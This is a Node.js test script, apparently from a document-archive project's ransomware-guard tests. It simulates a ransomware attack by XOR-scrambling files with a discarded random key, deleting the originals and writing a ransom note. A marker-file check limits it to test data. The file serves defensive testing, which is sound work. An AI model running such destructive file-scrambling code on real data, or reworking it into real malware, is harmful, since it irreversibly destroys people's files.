#!/usr/bin/env node
// Simulated ransomware attack for manual experiments (docs/user/ransomware.md, "Trying it out").
//
//   node crates/pl-guard/tests/simulate-ransomware.mjs <MEDIA_ROOT> [--count 30]
//
// "Encrypts" originals (XOR with a random stream), stores them as <name>.locked, deletes the original
// and writes a ransom note – like real ransomware programs. ONLY ON TEST DATA: the script
// only runs if the marker file `.paperrust-test-media` is in the folder. Beforehand e.g.:
//
//   cp -r media /tmp/media-test && touch /tmp/media-test/.paperrust-test-media
//
// No way back: afterwards the data can only be restored from the backup.

import fs from 'node:fs'
import path from 'node:path'
import crypto from 'node:crypto'

const args = process.argv.slice(2)
const root = args.find((a) => !a.startsWith('--'))
const ci = args.indexOf('--count')
const count = ci >= 0 ? Number(args[ci + 1]) : 30
if (!root || !Number.isFinite(count) || count < 1) {
  console.error('usage: simulate-ransomware.mjs <MEDIA_ROOT> [--count N]')
  process.exit(2)
}
if (!fs.existsSync(path.join(root, '.paperrust-test-media'))) {
  console.error(`refusing: ${root} has no .paperrust-test-media marker (only use a copy with test data)`)
  process.exit(1)
}
const originals = path.join(root, 'documents', 'originals')
const files = []
const walk = (d) => {
  for (const e of fs.readdirSync(d, { withFileTypes: true })) {
    const p = path.join(d, e.name)
    if (e.isDirectory()) walk(p)
    else if (!e.name.endsWith('.locked')) files.push(p)
  }
}
walk(originals)
files.sort()
let n = 0
for (const p of files.slice(0, count)) {
  const data = fs.readFileSync(p)
  const ks = crypto.randomBytes(data.length)
  for (let i = 0; i < data.length; i++) data[i] ^= ks[i]
  fs.writeFileSync(p + '.locked', data)
  fs.unlinkSync(p)
  n++
}
fs.writeFileSync(path.join(originals, 'README_DECRYPT.txt'), 'Your files are encrypted. (PaperRust test)\n')
console.log(`encrypted ${n} file(s) under ${originals}`)
